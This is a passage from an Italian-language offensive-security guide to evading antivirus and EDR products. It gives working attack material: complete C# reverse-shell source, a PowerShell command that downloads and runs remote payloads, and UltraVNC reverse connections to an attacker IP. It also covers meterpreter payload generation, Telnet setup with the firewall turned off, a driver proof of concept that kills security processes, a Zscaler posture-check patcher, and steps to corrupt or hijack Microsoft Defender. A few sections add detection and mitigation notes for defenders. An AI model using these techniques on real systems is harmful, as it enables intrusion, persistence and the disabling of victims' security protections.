- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator è un framework di code obfuscation granulare per i linguaggi supportati da LLVM, che utilizza ROP (return-oriented programming). ROPfuscator offusca un programma a livello di codice assembly trasformando le istruzioni normali in catene ROP, ostacolando la nostra concezione naturale del normale flusso di controllo.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt è un .NET PE Crypter scritto in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor è in grado di convertire EXE/DLL esistenti in shellcode e poi caricarli

## SmartScreen & MoTW

Potresti aver visto questa schermata durante il download e l'esecuzione di alcuni eseguibili da Internet.

Microsoft Defender SmartScreen è un meccanismo di sicurezza progettato per proteggere l'utente finale dall'esecuzione di applicazioni potenzialmente dannose.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen funziona principalmente con un approccio basato sulla reputazione: ciò significa che le applicazioni scaricate raramente attiveranno SmartScreen, che avviserà quindi l'utente finale e impedirà l'esecuzione del file (anche se il file può comunque essere eseguito facendo clic su More Info -> Run anyway).

**MoTW** (Mark of The Web) è un [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) con il nome Zone.Identifier, creato automaticamente quando si scaricano file da Internet, insieme all'URL da cui sono stati scaricati.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Controllo dell'ADS Zone.Identifier di un file scaricato da Internet.</p></figcaption></figure>

> [!TIP]
> È importante notare che gli eseguibili firmati con un certificato di firma **trusted** **non attiveranno SmartScreen**.

Un modo molto efficace per impedire ai propri payload di ricevere il Mark of The Web consiste nel pacchettarli all'interno di una sorta di container, come un ISO. Questo accade perché il Mark-of-the-Web (MOTW) **non può** essere applicato a volumi **non NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) è uno strumento che pacchettizza i payload in container di output per eludere il Mark-of-the-Web.

Esempio di utilizzo:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Ecco una demo per bypassare SmartScreen impacchettando i payload all'interno di file ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) è un potente meccanismo di logging in Windows che consente alle applicazioni e ai componenti di sistema di **registrare eventi**. Tuttavia, può anche essere utilizzato dai prodotti di sicurezza per monitorare e rilevare attività malevole.

Analogamente a come viene disabilitato (bypassato) AMSI, è anche possibile fare in modo che la funzione **`EtwEventWrite`** del processo user space ritorni immediatamente senza registrare alcun evento. Questo viene fatto patchando la funzione in memoria affinché ritorni immediatamente, disabilitando di fatto il logging ETW per quel processo.

Puoi trovare maggiori informazioni in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) e [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Reflection di Assembly C#

Il caricamento di binari C# in memoria è noto da parecchio tempo ed è ancora un ottimo metodo per eseguire i tuoi strumenti di post-exploitation senza farti rilevare dall'AV.

Poiché il payload verrà caricato direttamente in memoria senza toccare il disco, dovremo preoccuparci solo di patchare AMSI per l'intero processo.

La maggior parte dei framework C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, ecc.) offre già la possibilità di eseguire assembly C# direttamente in memoria, ma esistono diversi modi per farlo:

- **Fork\&Run**

Consiste nel **creare un nuovo processo sacrificabile**, iniettare il tuo codice malevolo di post-exploitation in quel nuovo processo, eseguire il codice malevolo e, al termine, terminare il nuovo processo. Questo presenta sia vantaggi che svantaggi. Il vantaggio del metodo fork and run è che l'esecuzione avviene **al di fuori** del processo del nostro impianto Beacon. Ciò significa che, se qualcosa nella nostra attività di post-exploitation va storto o viene rilevato, c'è una **possibilità molto maggiore** che il nostro **implant sopravviva**. Lo svantaggio è che c'è una **maggiore probabilità** di essere rilevati dai **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Consiste nell'iniettare il codice malevolo di post-exploitation **nel proprio processo**. In questo modo puoi evitare di dover creare un nuovo processo e farlo analizzare dall'AV, ma lo svantaggio è che, se qualcosa va storto durante l'esecuzione del payload, c'è una **possibilità molto maggiore** di **perdere il beacon**, poiché potrebbe andare in crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Se vuoi leggere altro sul caricamento di Assembly C#, consulta questo articolo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e il loro InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Puoi anche caricare Assembly C# **da PowerShell**; consulta [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e il [video di S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Uso di altri linguaggi di programmazione

Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi, fornendo alla macchina compromessa l'accesso **all'ambiente dell'interprete installato sulla condivisione SMB controllata dall'Attacker**.

Consentendo l'accesso ai binari dell'interprete e all'ambiente sulla condivisione SMB, puoi **eseguire codice arbitrario in questi linguaggi all'interno della memoria** della macchina compromessa.

Il repository indica quanto segue: Defender continua a scansionare gli script, ma utilizzando Go, Java, PHP, ecc. abbiamo **maggiore flessibilità per bypassare le signature statiche**. I test con script reverse shell casuali e non offuscati in questi linguaggi hanno dato risultati positivi.

## TokenStomping

Il token stomping manipola l'access token di un prodotto di sicurezza come un EDR o un AV. Ridurre i privilegi del token può lasciare il processo in esecuzione, impedendogli al contempo di eseguire attività privilegiate di ispezione o remediation.

Per impedirlo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Uso di software affidabile

### Chrome Remote Desktop

Come descritto in [**questo post del blog**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile distribuire Chrome Remote Desktop sul PC della vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:<sup>[[35]](#references)</sup>
1. Scarica il software da https://remotedesktop.google.com/, fai clic su "Set up via SSH", quindi fai clic sul file MSI per Windows per scaricare il file MSI.
2. Esegui silenziosamente l'installer sulla macchina della vittima (sono richiesti privilegi di amministratore): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e fai clic su Avanti. La procedura guidata ti chiederà quindi di autorizzare l'operazione; fai clic sul pulsante Authorize per continuare.
4. Esegui il comando fornito apportando le modifiche necessarie: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (il parametro `--pin` imposta il PIN senza usare la GUI).


## Evasione avanzata

L'evasione è un argomento molto complesso; a volte devi tenere conto di molte fonti diverse di telemetria all'interno di un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati negli ambienti maturi.

Ogni ambiente che attacchi avrà i propri punti di forza e di debolezza.

Ti consiglio vivamente di guardare questo intervento di [@ATTL4S](https://twitter.com/DaniLJ94), per acquisire una base sulle tecniche di Evasione avanzata.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo intervento di [@mariuszbit](https://twitter.com/mariuszbit) sull'Evasione in profondità.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Tecniche obsolete**

### **Verificare quali parti Defender rileva come malevole**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), che **rimuoverà parti del binario** finché non **individuerà quale parte Defender** sta rilevando come malevola, indicandotela.\
Un altro strumento che fa **la stessa cosa è** [**avred**](https://github.com/dobin/avred), con un servizio web disponibile all'indirizzo [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Server Telnet**

Fino a Windows10, tutte le versioni di Windows includevano un **server Telnet** che potevi installare (come amministratore) eseguendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fallo **avviare** all'avvio del sistema ed **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambia la porta telnet** (stealth) **e disabilita il firewall:**
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Scaricalo da: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (sono necessari i download bin, non il setup)

**SULL'HOST**: Esegui _**winvnc.exe**_ e configura il server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Quindi sposta il binario _**winvnc.exe**_ e il file **UltraVNC.ini** appena creato all'interno della **vittima**

#### Reverse connection

L'**attacker** deve **eseguire all'interno** del proprio **host** il binario `vncviewer.exe -listen 5900`, così sarà **preparato** a ricevere una **connessione VNC** inversa. Quindi, all'interno della **vittima**: avvia il daemon winvnc `winvnc.exe -run` ed esegui `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATTENZIONE:** Per mantenere la stealth non devi fare alcune cose

- Non avviare `winvnc` se è già in esecuzione, altrimenti attiverai un [popup](https://i.imgur.com/1SROTTl.png). verifica se è in esecuzione con `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory, altrimenti si aprirà [la finestra di configurazione](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per ottenere aiuto, altrimenti attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Scaricalo da: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il listener** con `msfconsole -r file.rc` ed **esegui** l'**xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Il defender attuale terminerà il processo molto rapidamente.**

### Compilare la nostra reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell C#

Compilala con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando il compilatore
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download ed esecuzione automatici:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco degli offuscatori C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Utilizzo di python per un esempio di build injector:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Terminare AV/EDR Dal Kernel Space

Storm-2603 ha sfruttato una piccola console utility nota come **Antivirus Terminator** per disabilitare le protezioni degli endpoint prima di distribuire il ransomware. Il tool porta con sé il proprio **driver vulnerabile ma *signed*** e ne abusa per eseguire operazioni privilegiate nel kernel che persino i servizi AV Protected-Process-Light (PPL) non possono bloccare.<sup>[[12]](#references)</sup>

Concetti chiave
1. **Signed driver**: il file scritto su disco è `ServiceMouse.sys`, ma il binary è il driver legittimamente signed `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” di Antiy Labs. Poiché il driver dispone di una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è abilitato.
2. **Installazione del service**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia, rendendo `\\.\ServiceMouse` accessibile dallo user land.
3. **IOCTL esposti dal driver**
| Codice IOCTL | Capacità                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminare un processo arbitrario tramite PID (utilizzato per terminare i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario dal disco |
| `0x990001D0` | Scaricare il driver e rimuovere il service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD aggira completamente le protezioni user-mode; il codice eseguito nel kernel può aprire processi *protected*, terminarli o manomettere gli oggetti del kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la vulnerable-driver block list di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti di caricare `AToolsKrnl64.sys`.
•  Monitorare la creazione di nuovi service *kernel* e generare alert quando un driver viene caricato da una directory world-writable o non è presente nell’allow-list.
•  Monitorare gli handle user-mode verso custom device objects seguiti da chiamate `DeviceIoControl` sospette.

### Bypassing dei Posture Checks di Zscaler Client Connector tramite Patching del Binary su Disco

Il **Client Connector** di Zscaler applica localmente le regole di device-posture e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente lato client** (al server viene inviato un booleano).
2. Gli endpoint RPC interni verificano soltanto che l’executable che effettua la connessione sia **signed da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Eseguendo il **patching di quattro binary signed su disco**, entrambi i meccanismi possono essere neutralizzati:

| Binary | Logica originale sottoposta a patch | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi ogni check risulta compliant |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo, anche unsigned, può effettuare il bind alle RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks sul tunnel | Bypassati |

Estratto minimale del patcher:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i posture check risultano **green/compliant**.
* I binari unsigned o modificati possono aprire gli endpoint RPC named-pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust esclusivamente lato client e semplici signature check possano essere eluse con poche patch ai byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) applica una gerarchia signer/level, in modo che solo i protected process con livello uguale o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binary abilitato per PPL e controllarne gli argomenti, puoi trasformare una funzionalità benigna (ad es. il logging) in una write primitive vincolata e supportata da PPL contro le protected directories utilizzate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa fa eseguire un processo come PPL
- L'EXE target (e tutte le DLL caricate) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un protection level compatibile che corrisponda al signer del binary (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per gli anti-malware signer, `PROTECTION_LEVEL_WINDOWS` per i Windows signer). Livelli errati causeranno il fallimento della creazione.

Vedi anche un'introduzione più ampia a PP/PPL e alla protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti di launcher
- Helper open-source: CreateProcessAsPPL (seleziona il protection level e inoltra gli argomenti all'EXE target):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Pattern di utilizzo:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` esegue autonomamente un nuovo processo e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando viene avviato come processo PPL, la scrittura del file avviene con il supporto di PPL.
- ClipUp non può analizzare percorsi contenenti spazi; usa i percorsi brevi 8.3 per puntare a posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: `dir /x` in ogni directory padre.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad esempio CreateProcessAsPPL).
2) Passa l'argomento relativo al percorso del log di ClipUp per forzare la creazione di un file in una directory AV protetta (ad esempio Defender Platform). Usa i nomi brevi 8.3 se necessario.
3) Se il binario di destinazione viene normalmente aperto/bloccato dall'AV durante l'esecuzione (ad esempio MsMpEng.exe), pianifica la scrittura all'avvio, prima che l'AV venga avviato, installando un servizio auto-start che venga eseguito in modo affidabile in precedenza. Convalida l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio, la scrittura supportata da PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file di destinazione e impedendo l'avvio.

Esempio di invocazione (percorsi oscurati/abbreviati per motivi di sicurezza):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non è possibile controllare il contenuto che ClipUp scrive, oltre alla posizione; la primitive è adatta alla corruzione piuttosto che all'iniezione precisa di contenuti.
- Richiede privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra temporale per il riavvio.
- Il timing è critico: il target non deve essere aperto; l'esecuzione al boot evita i file lock.

Rilevamenti
- Creazione del processo `ClipUp.exe` con argomenti insoliti, soprattutto quando il processo padre è un launcher non standard, in prossimità del boot.
- Nuovi servizi configurati per l'avvio automatico di binari sospetti e avviati sistematicamente prima di Defender/AV. Analizzare la creazione/modifica dei servizi prima dei malfunzionamenti di avvio di Defender.
- Monitoraggio dell'integrità dei file dei binari di Defender e delle directory Platform; creazioni/modifiche impreviste eseguite da processi con protected-process flags.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e utilizzi anomali del livello PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e da quali processi padre; bloccare l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Service hygiene: limitare la creazione/modifica dei servizi ad avvio automatico e monitorare la manipolazione dell'ordine di avvio.
- Assicurarsi che la tamper protection di Defender e le protezioni early-launch siano abilitate; analizzare gli errori di avvio che indicano la corruzione dei binari.
- Valutare la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano gli strumenti di sicurezza, se compatibile con il proprio ambiente (testare accuratamente).

## Manomissione di Microsoft Defender tramite Platform Version Folder Symlink Hijack

Windows Defender sceglie la platform da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione lessicograficamente più alta (ad esempio, `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione considera attendibili le directory entry, inclusi i directory reparse points (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un percorso scrivibile dall'attacker e ottenere DLL sideloading o interrompere il servizio.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di riavviare il sistema o attivare una nuova selezione della platform di Defender (riavvio del servizio al boot)
- Sono necessari solo strumenti integrati (`mklink`)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la selezione della platform considera attendibili le directory entry e seleziona la versione lessicograficamente più alta senza verificare che la destinazione risolva a un percorso protetto/attendibile.

Procedura passo-passo (esempio)
1) Preparare una copia scrivibile della cartella della platform corrente, ad esempio `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory di versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Opzioni di post-exploitation
- DLL sideloading/code execution: Inserisci/sostituisci DLL che Defender carica dalla propria directory dell’applicazione per eseguire codice nei processi di Defender. Consulta la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Terminazione/denial del servizio: Rimuovi il version-symlink in modo che, al successivo avvio, il percorso configurato non venga risolto e Defender non riesca ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce privilege escalation di per sé; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

